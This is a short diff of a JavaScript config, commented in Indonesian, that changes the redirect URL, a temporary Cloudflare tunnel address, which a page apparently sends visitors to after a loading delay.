@@ -7,7 +7,7 @@ const CONFIG = {
     // ============================================
     // LINK CLOUDFLARE TUNNEL (tujuan redirect)
     // ============================================
-    redirectUrl: "https://attribute-comparative-montana-therapist.trycloudflare.com/acr-nexus",
+    redirectUrl: "https://wants-serious-defines-traditional.trycloudflare.com/acr-nexus",
     
     // ============================================
     // DURASI LOADING (dalam milidetik)
